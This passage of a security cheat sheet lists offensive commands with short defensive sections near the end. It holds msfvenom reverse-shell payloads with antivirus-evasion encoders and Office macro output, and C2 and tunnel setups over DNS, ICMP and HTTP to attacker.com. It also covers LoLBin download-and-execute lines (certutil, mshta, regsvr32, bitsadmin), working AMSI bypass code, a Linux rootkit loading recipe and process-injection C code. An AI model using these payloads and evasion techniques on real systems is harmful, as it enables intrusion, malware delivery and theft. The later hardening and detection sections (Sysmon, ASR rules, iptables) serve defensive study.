  LHOST=192.168.1.100 LPORT=4444 \
  -f raw > shell.py

# ── Encoded payloads (AV/IDS evasion) ────────────────────────────────────────
# shikata_ga_nai — polymorphic XOR encoder (most effective, rated 'excellent')
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai \   # encoder name
  -i 7 \                    # encode 7 times (more iterations = harder to detect)
  -f exe > encoded.exe

# 64-bit XOR dynamic encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x64/xor_dynamic -i 5 \
  -f exe > encoded64.exe

# ── Shellcode output (for embedding in custom loaders) ────────────────────────
# Raw shellcode bytes
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw > shellcode.bin

# Python variable (paste directly into Python script)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f py -v shellcode

# C array (paste into C source code)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f c

# ── Custom PE template (change PE structure to break signatures) ───────────────
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=444 \
  -x /path/to/custom_template.exe \
  -f exe > bypass.exe
# Template was modified (different SCSIZE in template.c) → different PE structure
# → signature engines that matched the original won't match this

# ── VBA macro (for Office document payloads) ──────────────────────────────────
msfvenom -p generic/custom \
  PAYLOADFILE=/home/user/payload.exe \
  -a x64 --platform windows \
  -f vba-exe
# Output: paste this VBA code into an Office document's macro editor
```

---

### Metasploit — msfconsole

> Interactive exploitation framework console.

```bash
# Start
msfconsole
msfconsole -q    # quiet mode (no banner)

# Set up a listener to catch reverse shells
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false   # keep listening after first session
exploit -j                # run as background job

# One-liner version
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; set ExitOnSession false; exploit -j"

# List active sessions
sessions -l

# Interact with session #1
sessions -i 1

# Background current session
background

# Port scan using Metasploit auxiliary module
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,3389
set THREADS 50
run
```

---

## 🚇 Tunneling Tools

### SSH (OpenSSH)

> Encrypted shell protocol. Used for tunneling any protocol inside an SSH connection to bypass firewalls.

```bash
# ── Local port forwarding ─────────────────────────────────────────────────────
# "Forward my local port 8080 to internal-server:80 via ssh.example.com"
# → Browse http://localhost:8080 → reaches internal-server:80
ssh -L 8080:internal-server:80 user@ssh.example.com

# Run in background, no shell (-N), go to background (-f)
ssh -f -N -L 8080:internal-server:80 user@ssh.example.com

# Forward local port 5432 to reach a database inside the network
ssh -f -N -L 5432:db-server.internal:5432 user@bastion.example.com

# ── Remote port forwarding ────────────────────────────────────────────────────
# "Expose my local port 3000 as port 9090 on the remote SSH server"
# → Anyone connecting to ssh.example.com:9090 reaches YOUR localhost:3000
ssh -f -N -R 9090:localhost:3000 user@ssh.example.com

# ── Dynamic port forwarding (SOCKS5 proxy) ────────────────────────────────────
# Creates a SOCKS5 proxy at localhost:1080
# Configure your browser/tool to use SOCKS5: 127.0.0.1:1080
# → ALL traffic routes through the SSH server
ssh -f -N -D 1080 user@ssh.example.com

# Use the SOCKS5 proxy with curl
curl --socks5 127.0.0.1:1080 http://internal-site.com/

# Use with proxychains (routes any tool through the proxy)
# Edit /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -p 80,443 internal-server

# ── SSH over non-standard port (bypass port 22 blocks) ────────────────────────
# Connect on port 443 (HTTPS port — almost never blocked)
ssh -p 443 user@ssh.example.com

# ── Jump host (ProxyJump) — reach hosts behind a bastion ─────────────────────
ssh -J bastion.example.com user@internal-server.local

# ── Multiplexed connections (reuse existing SSH session for tunnels) ───────────
# Edit ~/.ssh/config:
# Host bastion
#   HostName bastion.example.com
#   User admin
#   ControlMaster auto
#   ControlPath ~/.ssh/cm-%r@%h:%p
#   ControlPersist 10m
```

---

### Chisel

> Fast TCP/UDP tunnel over HTTP/WebSocket. Extremely effective for bypassing firewalls since traffic looks like normal web traffic.

```bash
# ── Server (attacker's external machine) ─────────────────────────────────────
./chisel server --port 8080 --reverse
# --reverse: allows clients to create reverse tunnels (essential)

# ── Client (inside the target network — initiates outbound HTTP) ─────────────

# Reverse SOCKS5 proxy — route attacker's traffic through the internal network
./chisel client http://attacker.com:8080 R:socks
# Attacker now has a SOCKS5 proxy at 127.0.0.1:1080
# Route any tool through it: proxychains nmap -sT <internal_target>

# Reverse port forward — expose an internal service to the attacker
./chisel client http://attacker.com:8080 R:3306:internal-db:3306
# Attacker connects to 127.0.0.1:3306 → reaches internal-db:3306

# Forward tunnel — give the internal machine access to an attacker service
./chisel client http://attacker.com:8080 9090:attacker.com:9090

# ── Run over HTTPS (even harder to detect) ────────────────────────────────────
./chisel server --port 443 --reverse --tls-key server.key --tls-cert server.crt
./chisel client https://attacker.com:443 R:socks
```

---

### HTTPort / HTTHost

> Tunnels any TCP protocol through HTTP port 80. Bypasses firewalls that block everything except web traffic.

```
HTTHost setup (on machine OUTSIDE the firewall):
  1. Run HTTHost.exe
  2. Keep default settings, enter a password
  3. Check "Revalidate DNS names" and "Log connections"
  4. Click Apply
  5. Confirm in the Application Log tab:
     "Listener: listening at <IP>:90"

HTTPort setup (on machine INSIDE the firewall):
  1. Run HTTPort.exe → Proxy tab:
     - Proxy host:   <HTTHost machine's public IP>
     - Proxy port:   90
     - Password:     <same password>
  2. Port Mapping tab → Add:
     - Local port:   8021       (any local port)
     - Remote host:  ftp.target.com
     - Remote port:  21
  3. Click Start
  4. Connect: ftp 127.0.0.1 8021
     → HTTPort wraps this in HTTP → sends to HTTHost on port 80
     → HTTHost unwraps and forwards to ftp.target.com:21
```

---

### iodine (DNS Tunnel)

> Tunnels IPv4 traffic over DNS queries/responses. Works through almost any firewall since DNS (port 53) is almost universally allowed.

```bash
# ── Prerequisites ─────────────────────────────────────────────────────────────
# 1. You own a domain: attacker.com
# 2. Create an NS record: tunnel.attacker.com → your VPS IP
#    (All DNS queries for *.tunnel.attacker.com will reach your VPS)

# ── Server side (your VPS with public IP) ─────────────────────────────────────
sudo iodined \
  -f \                          # run in foreground
  -c \                          # disable client IP check (useful behind NAT)
  -P password123 \              # shared password
  10.0.0.1 \                    # tunnel IP for the server side
  tunnel.attacker.com           # the NS domain you control

# ── Client side (inside the target network) ───────────────────────────────────
sudo iodine \
  -f \                          # run in foreground
  -P password123 \              # same password
  ns.attacker.com \             # the DNS server to send queries to
  tunnel.attacker.com           # your NS domain

# After successful connection:
# A tun0 interface appears with IP 10.0.0.2
# SSH through the DNS tunnel:
ssh user@10.0.0.1               # reaches your VPS via the DNS tunnel

# ── Check tunnel interface ────────────────────────────────────────────────────
ip addr show tun0
ping 10.0.0.1                   # ping the server through the tunnel
```

---

### dnscat2 (DNS Tunnel)

> Encrypted C2 channel over DNS. More focused on command-and-control than raw IP tunneling.

```bash
# ── Server (attacker's machine) ───────────────────────────────────────────────
gem install dnscat2           # install
ruby dnscat2.rb \
  --dns "domain=attacker.com,host=0.0.0.0" \
  --no-cache                  # disable caching (see all new connections)

# In the dnscat2 console:
dnscat2> sessions            # list connected clients
dnscat2> session -i 1        # interact with session 1
command (session 1)> shell   # get a shell
command (session 1)> download /etc/passwd /tmp/passwd  # download file

# ── Client (PowerShell — inside the target network) ───────────────────────────
Import-Module .\dnscat2.ps1
Start-Dnscat2 -Domain attacker.com -DNSServer 8.8.8.8
# Traffic goes: client → DNS resolver → attacker's domain → attacker's dnscat2 server
# Firewall sees only legitimate-looking DNS queries

# ── Client (Linux) ────────────────────────────────────────────────────────────
./dnscat --dns domain=attacker.com --secret=password123
```

---

### ptunnel-ng (ICMP Tunnel)

> Tunnels TCP connections inside ICMP echo (ping) packets. Bypasses firewalls that allow ICMP.

```bash
# ── Server side (machine INSIDE the network or a relay point) ─────────────────
sudo ptunnel-ng -x password123
# Listens for incoming ICMP tunnel connections

# ── Client side (attacker outside) ───────────────────────────────────────────
sudo ptunnel-ng \
  -p <server_ip> \     # IP of the ptunnel-ng server
  -lp 8000 \           # local port to listen on (attacker's side)
  -da <dest_ip> \      # final destination IP (SSH server inside network)
  -dp 22 \             # final destination port
  -x password123       # shared password

# Now SSH through the ICMP tunnel:
ssh -p 8000 user@localhost
# → SSH goes to localhost:8000
# → ptunnel-ng wraps it in ICMP
# → sends to the ptunnel-ng server
# → server unwraps and forwards to <dest_ip>:22
```

---

### PingRAT (ICMP C2)

> Command-and-control channel using ICMP. Commands are sent as ICMP echo request payloads; output returns in ICMP echo reply payloads.

```bash
# ── Server (attacker's machine — receives the C2 reverse connection) ──────────
sudo ./pingRAT -s -i eth0

# ── Client (victim machine — connects back to attacker over ICMP) ─────────────
sudo ./pingRAT -c <attacker_IP> -i eth0

# After connection:
# Type commands on the server → they're sent in ICMP echo request payloads
# Output from victim → returns in ICMP echo reply payloads
# Firewall sees only ping traffic — nothing to block
```

---

### Green Tunnel

> Anti-DPI tool. Fragments TLS ClientHello packets so DPI firewalls can't read the SNI field (which they use to block specific domains).

```bash
# Install (requires Node.js)
npm install -g green-tunnel

# Run with auto-detection (tries different bypass methods)
gt

# DNS over HTTPS (prevents DNS-based blocking)
gt --dns-type doh --dns-server https://cloudflare-dns.com/dns-query

# IP fragmentation mode (fragments the TLS ClientHello at IP level)
gt --ip-frag true

# TCP segmentation mode (splits the ClientHello across multiple TCP segments)
gt --tcp-window-size 1

# SNI replacement (sends a fake SNI to the server to confuse DPI)
gt --sni-mode fake --sni-host www.google.com
```

---

## 🎭 Evasion & Obfuscation Tools

### Hyperion (PE Encryptor)

> Encrypts Windows PE executables with AES-128. The encrypted binary brute-forces its own decryption key at runtime — static analysis only sees ciphertext.

```bash
# Run on Windows (or via Wine on Linux)

# Encrypt a payload executable
wine Hyperion.exe original_payload.exe encrypted_payload.exe
# Every run produces a DIFFERENT encrypted binary → different signature every time

# On execution, the stub:
# 1. Brute-forces the AES-128 key (takes < 1 second — half the keyspace is checked)
# 2. Decrypts the original payload in memory
# 3. Executes it directly in memory (no file written to disk)
```

---

### YARA

> Pattern-matching language for identifying malware by rules. Used by IDS engines, AV, and threat hunters.

```bash
# Install
sudo apt install -y yara

# Scan a single file against a rule file
yara rule.yar suspicious_file.exe

# Scan a directory recursively
yara -r rule.yar /path/to/scan/

# Compile rules for performance (faster on large-scale scans)
yarac rule.yar compiled_rules.bin
yara compiled_rules.bin /path/to/scan/

# Scan a running process by PID
yara rule.yar <PID>
```

**Rule writing:**
```yara
rule SuspiciousExecutable {
    meta:
        description = "Detects EXE files referencing cmd.exe or powershell"
        author      = "Analyst"
    strings:
        $mz    = { 4D 5A }              // MZ header = Windows PE file
        $str1  = "cmd.exe"    nocase    // case-insensitive string match
        $str2  = "powershell" nocase
        $hex1  = { 6A 40 68 00 30 00 } // specific hex byte sequence
    condition:
        $mz at 0 and               // must start with MZ
        any of ($str1, $str2) and  // must contain one of these strings
        filesize < 500KB           // only flag if < 500KB
}

rule NeverSeenBefore {
    condition:
        not any of them            // flag files matching NO known-good rule
}
```

---

### KoviD (Linux Rootkit)

> LKM (Loadable Kernel Module) rootkit for Linux. Hides processes, files, network connections, and itself from all user-space tools.

```bash
# Compile (must match the running kernel version)
make

# Load the rootkit module (requires root)
sudo insmod kovid.ko

# Verify it hid itself (returns nothing if working)
lsmod | grep kovid

# Interact via its configured magic command (set at compile time)
# All further interaction is through the hidden backdoor channel

# ── What it hides ─────────────────────────────────────────────────────────────
# Processes: hidden from ps, top, htop (/proc entries removed)
# Files:     hidden from ls, find (getdents64 hook)
# Network:   hidden from ss, netstat (/proc/net/tcp hook)
# Module:    hidden from lsmod (removed from kernel module list)

# ── Detection (defender's side) ──────────────────────────────────────────────
# Compare running process list at kernel level vs /proc
# Any discrepancy = rootkit hiding a process
# Tools: rkhunter, chkrootkit, Volatility (memory forensics)
sudo rkhunter --check
sudo chkrootkit
```

---

## 🔀 NAC Bypass Tools

### VLANPWN

> Exploits DTP (Dynamic Trunking Protocol) to perform VLAN hopping — gaining access to VLANs the attacker's port shouldn't be able to reach.

```bash
# ── DoubleTagging.py — 802.1Q double-tag VLAN hopping ────────────────────────
# Sends a frame with two 802.1Q VLAN tags
# Outer tag = native VLAN (stripped by first switch)
# Inner tag = target VLAN (forwarded by second switch)
python3 DoubleTagging.py \
  --interface eth0 \
  --nativevlan 1 \       # native VLAN of your switch port (usually VLAN 1)
  --targetvlan 20 \      # VLAN you want to access
  --victim 192.168.20.5 \
  --attacker 192.168.1.100

# ── DTPHijacking.py — force the switch to trunk with you ─────────────────────
# Sends a crafted DTP "desirable" frame
# Switch responds by enabling trunk mode → attacker sees ALL VLANs
python3 DTPHijacking.py --interface eth0
# After this: use Wireshark to capture traffic from all VLANs
```

---

### nac_bypass_setup.sh

> Sets up a Linux device (e.g., Raspberry Pi) as a transparent bridge between an already-authenticated device and the switch port. The NAC server sees only the authenticated device's credentials.

```bash
# Place the device physically between the authenticated workstation
# and the switch port (2 NICs required)

./nac_bypass_setup.sh \
  -1 eth0 \     # interface connected to the switch
  -2 eth1 \     # interface connected to the victim (authenticated) machine
  -a            # autonomous mode — auto-configure everything

# Additional options:
# -s            enable port redirection for OpenSSH (access the bridge remotely)
# -R            enable port redirection for Responder.py (credential capture)
# -g <MAC>      manually specify the gateway MAC address

# After setup: attacker has full network access using the victim's
# already-authenticated 802.1X session — NAC never re-challenges
```

---

## 🍯 Honeypot Tools

### Cowrie

> Medium-to-high interaction SSH and Telnet honeypot. Logs all brute-force attempts and all shell commands typed by attackers.

```bash
# ── Setup ─────────────────────────────────────────────────────────────────────
sudo adduser --disabled-password cowrie
sudo su - cowrie

git clone https://github.com/cowrie/cowrie
cd cowrie
virtualenv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt

cp etc/cowrie.cfg.dist etc/cowrie.cfg
# Edit etc/cowrie.cfg:
# [honeypot]
# hostname = prod-server-01   ← fake hostname attackers will see
# listen_port = 2222          ← Cowrie listens here

# Redirect real SSH to another port, Cowrie handles port 22
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222

# ── Start / stop ─────────────────────────────────────────────────────────────
bin/cowrie start
bin/cowrie stop
bin/cowrie restart
bin/cowrie status

# ── Monitor live activity ──────────────────────────────────────────────────────
tail -f var/log/cowrie/cowrie.log        # human-readable log
tail -f var/log/cowrie/cowrie.json       # JSON log (ingest into SIEM)

# ── Useful log queries ─────────────────────────────────────────────────────────
# See all attempted usernames and passwords
grep "login attempt" var/log/cowrie/cowrie.log | awk '{print $8, $10}'

# See all commands typed by attackers
grep "CMD:" var/log/cowrie/cowrie.log

# See all files downloaded by attackers
grep "Saved" var/log/cowrie/cowrie.log
```

---

### T-Pot

> All-in-one honeypot platform running ~30 honeypot daemons + Elastic Stack (Kibana dashboard) for visualization.

```bash
# ── Install (after Debian minimal install) ────────────────────────────────────
git clone https://github.com/telekom-security/tpotce
cd tpotce
sudo ./install.sh --type=STANDARD
# Reboots after install

# ── Access web interfaces ─────────────────────────────────────────────────────
# T-Pot Dashboard (Kibana):  https://<IP>:64297
# Cyberchef:                 https://<IP>:64294
# Elasticvue:                https://<IP>:64295
# Attack map (live):         https://<IP>:64299

# ── From the CLI ──────────────────────────────────────────────────────────────
# View running honeypot containers
sudo docker ps | grep tpot

# View real-time logs from a specific honeypot (e.g., Cowrie)
sudo docker logs -f tpotce_cowrie_1

# View Suricata alerts
tail -f /data/suricata/log/eve.json

# Check disk usage (T-Pot logs a lot)
df -h /data
```

---

### Honeyd

> Creates thousands of virtual honeypots simultaneously — simulates an entire network of fake hosts, each running fake services.

```bash
# Install
sudo apt install -y honeyd

# Basic config file (honeyd.conf):
cat > honeyd.conf << 'EOF'
create default
set default personality "Linux 2.4.20"
set default default tcp action reset

create webserver
set webserver personality "Apache/2.0"
set webserver default tcp action open
add webserver tcp port 80 "sh /usr/share/honeyd/scripts/http/apache-fake.sh"
add webserver tcp port 22 "sh /usr/share/honeyd/scripts/ssh/ssh.sh"

bind 192.168.1.200 webserver
bind 192.168.1.201 default
EOF

# Run Honeyd
sudo honeyd -d \                    # debug mode (foreground)
  -f honeyd.conf \                  # config file
  -l /var/log/honeyd.log \          # log file
  192.168.1.200 192.168.1.201       # IPs to simulate

# Run on an entire subnet
sudo honeyd -d -f honeyd.conf -l /var/log/honeyd.log 192.168.1.0/24
```

---

## 🔍 Honeypot Detection Tools

### Send-Safe Honeypot Hunter

> Tests proxy lists to identify which proxies are honeypots. Validates HTTPS, SOCKS4, and SOCKS5 proxies and flags fake ones.

```
Features:
- Checks HTTPS, SOCKS4, SOCKS5 proxies on any port
- Tests multiple proxy lists simultaneously
- Outputs: "Valid proxies" list and "All except honeypots" list
- Can upload results to FTP automatically
- Processes proxy lists on a repeating schedule
```

---

### Detecting Honeypots with nmap / arp-scan

```bash
# ── Method 1: Service fingerprinting ─────────────────────────────────────────
# Version mismatch = emulation = possible honeypot
nmap -sV -p 22,80,443,21,25 <target_ip>
nmap -A <target_ip>              # aggressive: OS + version + scripts
# Look for: claimed version that doesn't match actual behavior

# ── Method 2: Response time analysis ─────────────────────────────────────────
# Honeypots are slower (logging overhead)
ping -c 50 <target_ip>          # measure average RTT and variance
nmap -p 80 --scan-delay 1s --max-retries 5 <target_ip>
# Consistently high or highly variable latency → suspicious

# ── Method 3: MAC address OUI lookup ──────────────────────────────────────────
# VM-based honeypots use VM vendor MAC prefixes
arp-scan --interface=eth0 --localnet
arp -a

# Known VM OUI prefixes (= honeypot indicator):
# 00:50:56 → VMware
# 08:00:27 → VirtualBox
# 00:15:5D → Hyper-V
# 00:0C:29 → VMware (another range)

# ── Method 4: Port enumeration ────────────────────────────────────────────────
# Honeypots often have many open ports (emulating multiple services)
nmap -p- <target_ip>             # scan all 65,535 ports
# Many open ports on what claims to be a single-purpose server → suspicious

# ── Method 5: Banner / metadata analysis ──────────────────────────────────────
# Generic banners, default pages, self-signed certs = possible honeypot

# Grab SSH banner
nc -v <target_ip> 22

# Check HTTP headers
curl -I http://<target_ip>
curl -I https://<target_ip>

# Examine SSL certificate
openssl s_client -connect <target_ip>:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep -E "Subject:|Issuer:|Not"
# Self-signed cert with "localhost" or "honeypot" as CN → strong indicator

# ── Detecting Layer 2 tar pit (special MAC) ───────────────────────────────────
arp-scan --interface=eth0 --localnet
# MAC 00:00:0f:ff:ff:ff = Layer 2 tar pit (black-hole address)

# ── Detecting Layer 4 tar pit (zero TCP window) ───────────────────────────────
tcpdump -i eth0 'tcp[14:2] = 0'
# Persistent zero window = tar pit holding the connection open
```

---

## 💻 Windows Endpoint Evasion Commands

### BITS Abuse — bitsadmin

> Abuses the legitimate Windows Background Intelligent Transfer Service to download payloads. Looks like Windows Update traffic.

```cmd
:: Create a BITS job and download a payload
bitsadmin /create malware_job
bitsadmin /addfile malware_job http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
bitsadmin /resume malware_job

:: Create a persistence job that re-runs payload on reboot
bitsadmin /create persistence_job
bitsadmin /addfile persistence_job http://attacker.com/payload.exe C:\Temp\persist.exe
bitsadmin /SetNotifyCmdLine persistence_job C:\Temp\persist.exe NULL
bitsadmin /SetMinRetryDelay persistence_job 60
bitsadmin /resume persistence_job

:: List all current BITS jobs
bitsadmin /list /allusers /verbose
```

---

### BITS Abuse — PowerShell

```powershell
# Download via BITS (asynchronous)
Start-BitsTransfer -Source "http://attacker.com/payload.exe" `
                   -Destination "C:\Windows\Temp\payload.exe" `
                   -Asynchronous

# Check status of all BITS jobs (defender's audit command)
Get-BitsTransfer -AllUsers

# Cancel a specific job
Get-BitsTransfer -AllUsers | Where-Object {$_.DisplayName -eq "malware_job"} | Remove-BitsTransfer
```

---

### LoLBins Quick Reference

> Legitimate, signed Windows binaries abused to execute malicious actions without dropping new executables.

```cmd
:: certutil — download a file (looks like certificate management)
certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe

:: bitsadmin — download via BITS (looks like Windows Update)
bitsadmin /transfer job /download /priority normal http://attacker.com/p.exe C:\p.exe

:: mshta — execute a remote HTA (HTML Application) file
mshta http://attacker.com/payload.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""payload.exe"":close")

:: regsvr32 — execute a remote COM scriptlet (bypasses AppLocker)
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

:: rundll32 — execute JavaScript through rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://attacker.com/payload.sct")

:: wmic — execute a remote XSL stylesheet
wmic os get /format:http://attacker.com/payload.xsl

:: ConfigSecurityPolicy.exe — download file (looks like Defender policy update)
"C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe" http://attacker.com/payload.exe

:: CustomShellHost.exe — execute payload as a custom Windows shell
CustomShellHost.exe
```

---

### AMSI Bypass — PowerShell

> AMSI (Antimalware Scan Interface) scans PowerShell scripts before execution. These techniques disable it.

```powershell
# ── Technique 1: PowerShell Downgrade ─────────────────────────────────────────
# PowerShell v2 has NO AMSI — downgrade to it
powershell -version 2
# Now run any script without AMSI scanning

# ── Technique 2: String Obfuscation ──────────────────────────────────────────
# AMSI scans for literal strings like "Invoke-Mimikatz"
# Break the string so AMSI never sees it complete:
$cmd = "Inv" + "oke" + "-Mimi" + "katz"
IEX $cmd

# Use AmsiTrigger to find exactly which line triggers AMSI:
AmsiTrigger_x64.exe -i script.ps1 -f 3
# Then obfuscate only those specific lines

# ── Technique 3: Force amsiInitFailed = true ──────────────────────────────────
# AMSI stops scanning when initialization appears to have failed
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").
    GetField("amsiSession","NonPublic,Static").SetValue($null,$null)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").
    GetField("amsiContext","NonPublic,Static").SetValue($null,[IntPtr]$mem)
# AMSI is now disabled for this PowerShell session

# ── Technique 4: Memory hijacking (patch AmsiScanBuffer) ──────────────────────
# Load ASBBypass.dll which patches AmsiScanBuffer() to always return AMSI_RESULT_CLEAN
[System.Reflection.Assembly]::LoadFile("C:\path\to\ASBBypass.dll")
[Amsi]::Bypass()
# All subsequent AMSI scans return "clean" — no blocking

# ── Encoded command execution (bypass string-based EDR detection) ───────────────
$command = 'Invoke-WebRequest -Uri http://attacker.com/p.exe -OutFile C:\Users\Public\p.exe; Start-Process C:\Users\Public\p.exe'
$bytes   = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded
# EDR/AMSI sees only a Base64 blob — not the malicious strings
```

---

### Process Injection — Windows API

> Injects shellcode into a legitimate running process. Makes malware appear to be part of a trusted application.

```c
// Full process injection sequence using Windows API
// Target: inject shellcode into svchost.exe (PID = targetPID)

// Step 1: Get handle to the target process
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,   // full access (required for all 3 steps below)
    FALSE,
    targetPID             // PID of svchost.exe or explorer.exe
);

// Step 2: Allocate executable memory inside the target process
LPVOID pRemoteCode = VirtualAllocEx(
    hProcess,
    NULL,                          // let OS choose address
    shellcode_size,                // size of your shellcode
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE         // must be executable!
);

// Step 3: Write the shellcode into that memory
WriteProcessMemory(
    hProcess,
    pRemoteCode,       // destination: inside target process
    shellcode,         // source: your shellcode buffer
    shellcode_size,
    NULL
);

// Step 4: Create a new thread in the target process starting at the shellcode
HANDLE hThread = CreateRemoteThread(
    hProcess,
    NULL, 0,
    (LPTHREAD_START_ROUTINE)pRemoteCode,  // entry point = shellcode start
    NULL, 0, NULL
);

// The shellcode now runs inside svchost.exe
// EDR sees: svchost.exe is making a network connection
// (legitimate-looking — much harder to flag than an unknown process)
```

---

## 🛡️ Countermeasure Commands

### iptables Hardening

```bash
# Full hardened default-deny configuration

# Set default-deny policies
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Allow loopback
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT

# Allow established sessions back in (stateful inspection)
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow only specific inbound services
sudo iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT  # SSH from mgmt only
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT                    # HTTPS

# Anti-spoofing — drop private IPs arriving on external interface
sudo iptables -A INPUT -i eth0 -s 10.0.0.0/8     -j DROP
sudo iptables -A INPUT -i eth0 -s 172.16.0.0/12  -j DROP
sudo iptables -A INPUT -i eth0 -s 192.168.0.0/16 -j DROP
sudo iptables -A INPUT -i eth0 -s 127.0.0.0/8    -j DROP

# Block source routing
sudo sysctl -w net.ipv4.conf.all.accept_source_route=0

# ICMP — allow only necessary types
sudo iptables -A INPUT -p icmp --icmp-type 3  -j ACCEPT   # Destination Unreachable
sudo iptables -A INPUT -p icmp --icmp-type 11 -j ACCEPT   # Time Exceeded
sudo iptables -A INPUT -p icmp -j DROP                     # drop all other ICMP

# DNS restriction — only allow DNS to your resolver
sudo iptables -A OUTPUT -p udp --dport 53 ! -d 192.168.1.1 -j DROP
sudo iptables -A OUTPUT -p tcp --dport 53 ! -d 192.168.1.1 -j DROP

# Save rules permanently
sudo netfilter-persistent save
```

---

### Sysmon

> Windows system monitoring tool. Logs process creation, network connections, file creation, registry changes, DLL loads, and remote thread creation.

```powershell
# Download Sysmon from: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
# Download config from: https://github.com/SwiftOnSecurity/sysmon-config

# Install Sysmon with config
sysmon64.exe -accepteula -i sysmonconfig.xml

# Update config without reinstalling
sysmon64.exe -c sysmonconfig.xml

# Uninstall
sysmon64.exe -u

# View Sysmon events in PowerShell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Select-Object -First 20

# Key Event IDs to monitor:
# 1  = Process Create (with full command line)
# 3  = Network Connection (process + dest IP + port)
# 7  = Image Loaded (DLL load — detect DLL hijacking)
# 8  = CreateRemoteThread (process injection indicator)
# 10 = ProcessAccess (credential dumping / injection indicator)
# 11 = File Create
# 12/13 = Registry Create/Set (persistence detection)
# 22 = DNS Query (detect DGA / unusual DNS activity)
```

---

### PowerShell Hardening

```powershell
# Enable Script Block Logging (Event ID 4104 — captures all scripts before execution)
# via GPO: Computer Configuration → Admin Templates → Windows Components →
#          Windows PowerShell → Turn on PowerShell Script Block Logging → Enabled

# Or via registry:
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 1

# Enable Module Logging (logs all module activity)
$regPath2 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
New-Item -Path $regPath2 -Force
Set-ItemProperty -Path $regPath2 -Name "EnableModuleLogging" -Value 1
Set-ItemProperty -Path $regPath2 -Name "ModuleNames" -Value @("*")

# Set execution policy to require signed scripts
Set-ExecutionPolicy AllSigned -Scope LocalMachine -Force

# Disable PowerShell v2 (no AMSI — must be removed entirely)
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root

# Constrained Language Mode via AppLocker (limits .NET / COM / reflection)
# Enable AppLocker with a default ruleset — CLM is automatically applied
# to non-whitelisted scripts
```

---

### Windows Defender ASR Rules

> Attack Surface Reduction rules block specific attack techniques (macro abuse, LoLBins, injection) at the OS level.

```powershell
# Enable all recommended ASR rules
$rules = @{
    # Block Office from creating child processes
    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" = "Enabled"
    # Block Office from injecting into other processes
    "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84" = "Enabled"
    # Block JavaScript/VBScript from launching downloaded executables
    "D3E037E1-3EB8-44C8-A917-57927947596D" = "Enabled"
    # Block execution of potentially obfuscated scripts
    "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" = "Enabled"
    # Block Win32 API calls from Office macros
    "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B" = "Enabled"
    # Block credential stealing from LSASS
    "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2" = "Enabled"
    # Block process creations from PSExec and WMI
    "D1E49AAC-8F56-4280-B9BA-993A6D77406C" = "Enabled"
    # Block untrusted and unsigned processes from USB
    "B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4" = "Enabled"
}

foreach ($ruleId in $rules.Keys) {
    Add-MpPreference -AttackSurfaceReductionRules_Ids $ruleId `
                     -AttackSurfaceReductionRules_Actions $rules[$ruleId]
}

# Check current ASR rule status
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
```

---

### Audit BITS Jobs

```powershell
# List all BITS jobs for all users (defender's audit)
Get-BitsTransfer -AllUsers | Select-Object DisplayName, JobState, TransferType, FileList

# Get detailed info including source URLs
Get-BitsTransfer -AllUsers | ForEach-Object {
    $job = $_
    $job.FileList | Select-Object @{N="Job";E={$job.DisplayName}},
                                  @{N="State";E={$job.JobState}},
                                  RemoteName, LocalName
}

# Cancel all BITS jobs (emergency cleanup)
Get-BitsTransfer -AllUsers | Remove-BitsTransfer

# Monitor BITS event log for new jobs
